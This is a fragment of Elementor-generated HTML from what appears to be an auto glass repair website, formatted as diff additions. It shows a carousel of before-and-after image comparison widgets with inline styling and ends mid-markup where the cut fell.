+							<div id="premium-carousel-wrapper-69336af" class="premium-carousel-wrapper premium-carousel-hidden carousel-wrapper-69336af  premium-carousel-dots-below premium-carousel-scale" data-settings="{&quot;vertical&quot;:false,&quot;appearance&quot;:&quot;single&quot;,&quot;slidesToShow&quot;:1,&quot;infinite&quot;:true,&quot;speed&quot;:300,&quot;fade&quot;:true,&quot;autoplay&quot;:true,&quot;autoplaySpeed&quot;:8000,&quot;draggable&quot;:false,&quot;touchMove&quot;:false,&quot;adaptiveHeight&quot;:false,&quot;variableWidth&quot;:false,&quot;cssEase&quot;:&quot;ease&quot;,&quot;pauseOnHover&quot;:true,&quot;centerMode&quot;:false,&quot;arrows&quot;:false,&quot;dots&quot;:true,&quot;slidesDesk&quot;:1,&quot;slidesTab&quot;:1,&quot;slidesMob&quot;:1,&quot;animation&quot;:&quot;null&quot;,&quot;tabletBreak&quot;:1025,&quot;mobileBreak&quot;:768,&quot;navigation&quot;:[],&quot;carouselNavigation&quot;:&quot;dots&quot;,&quot;templatesNumber&quot;:11,&quot;hasNavSlider&quot;:false,&quot;mouseTilt&quot;:false,&quot;mouseTiltRev&quot;:false}">
+			<!-- Dots -->
+							<div class="premium-carousel-nav-dot">
+												<i class="fas fa-square" aria-hidden="true"></i>
+										</div>
+			
+			
+			<!-- Main Slides -->
+			<div id="premium-carousel-69336af" class="premium-carousel-inner">
+										<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2669 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2669 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2669 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2669" class="elementor elementor-2669" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2664 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2664 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2664 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2664" class="elementor elementor-2664" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/12b-scaled.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/12a-scaled.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2659 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2659 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2659 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2659" class="elementor elementor-2659" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/11b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/11a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2654 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2654 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2654 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2654" class="elementor elementor-2654" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/10b-scaled.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/10a-scaled.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2649 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2649 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2649 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2649" class="elementor elementor-2649" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/9b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/9a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2644 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2644 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2644 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2644" class="elementor elementor-2644" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/8b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/8a-scaled.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2639 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2639 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2639 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2639" class="elementor elementor-2639" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/7b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/7a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-697 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-697 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-697 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="697" class="elementor elementor-697" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P5b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P5a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-689 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-689 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-689 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="689" class="elementor elementor-689" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P3b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P3a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-629 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-629 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-629 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="629" class="elementor elementor-629" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
